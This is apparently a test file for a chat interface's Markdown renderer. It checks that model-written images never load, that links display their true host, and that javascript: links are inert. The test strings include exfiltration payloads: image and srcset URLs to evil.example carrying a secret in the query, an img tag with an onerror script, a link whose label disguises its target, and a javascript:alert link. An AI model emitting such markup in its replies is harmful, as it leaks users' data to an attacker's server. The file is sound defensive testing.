import { afterEach, expect, test } from "bun:test";
import { act } from "react";
import { createRoot, type Root } from "react-dom/client";
import { TextMessagePartProvider } from "@assistant-ui/react";
import { installDom } from "@/test/dom";
import { MarkdownText } from "./markdown-text";

let restore: (() => void) | undefined;
const mounted = new Set<{ root: Root; host: HTMLElement }>();
afterEach(async () => {
  for (const { root, host } of mounted) { await act(async () => root.unmount()); host.remove(); }
  mounted.clear();
});

async function render(text: string) {
  restore ??= installDom();
  const host = document.createElement("div");
  document.body.append(host);
  const root = createRoot(host);
  mounted.add({ root, host });
  await act(async () => root.render(<TextMessagePartProvider text={text}><MarkdownText /></TextMessagePartProvider>));
  return host;
}

const SECRET = "FAKE-OWNER-DATA-1234";

test("an image a model wrote never reaches the DOM with a source, in any Markdown or HTML form", async () => {
  const host = await render([
    `![chart](https://evil.example/leak?d=${SECRET})`,
    `![ref image][r]`,
    `[r]: https://evil.example:8443/ref?d=${SECRET} "title"`,
    `<img src="https://evil.example/raw?d=${SECRET}" onerror="alert(1)">`,
    `<picture><source srcset="https://evil.example/s?d=${SECRET}"></picture>`,
    `[![badge](https://evil.example/badge?d=${SECRET})](https://evil.example/target)`,
  ].join("\n\n"));
  expect(host.querySelectorAll("img, picture, source, video, iframe, object, embed")).toHaveLength(0);
  expect(host.querySelectorAll("[src], [srcset], [poster], [data]")).toHaveLength(0);
  // What the owner sees instead of a Markdown image: the alt text and the host, never the address's path or query.
  expect(host.textContent).toContain("[Image not loaded: chart (evil.example)]");
  expect(host.textContent).toContain("[Image not loaded: ref image (evil.example:8443)]");
  expect(host.textContent).toContain("[Image not loaded: badge (evil.example)]");
  expect(host.textContent).not.toContain("/leak?");
  expect(host.textContent).not.toContain("/ref?");
  expect(host.textContent).not.toContain("/badge?");
  // Raw HTML is shown as literal text, never as elements, so it loads nothing either.
  expect(host.textContent).toContain('<img src="https://evil.example/raw');
});

test("a link shows its full host beside the label, so the label cannot hide where it goes", async () => {
  const host = await render([
    `[docs](https://evil.example:8443/path?d=${SECRET})`,
    `[https://good.example](https://evil.example/x)`,
    `see https://bare.example/a/b and www.auto.example`,
  ].join("\n\n"));
  const anchors = [...host.querySelectorAll("a")];
  const docs = anchors.find((anchor) => anchor.textContent === "docs")!;
  expect(docs.getAttribute("href")).toBe(`https://evil.example:8443/path?d=${SECRET}`);
  expect(docs.nextElementSibling?.textContent).toBe("(evil.example:8443)");
  const disguised = anchors.find((anchor) => anchor.textContent === "https://good.example")!;
  expect(disguised.nextElementSibling?.textContent).toBe("(evil.example)");
  expect(anchors.find((anchor) => anchor.getAttribute("href")?.startsWith("https://bare.example"))?.nextElementSibling?.textContent).toBe("(bare.example)");
  for (const anchor of anchors) {
    expect(anchor.getAttribute("rel")).toBe("noopener noreferrer nofollow");
    expect(anchor.getAttribute("referrerpolicy")).toBe("no-referrer");
  }
});

test("a link that is not a web address is plain text with nothing to open", async () => {
  const host = await render(["[run](javascript:alert(1))", "[mail](mailto:a@b.example)", "[jump](#section)"].join("\n\n"));
  expect(host.querySelectorAll("a")).toHaveLength(0);
  expect(host.textContent).toContain("run");
  expect(host.textContent).toContain("mail");
  expect(host.textContent).toContain("jump");
});
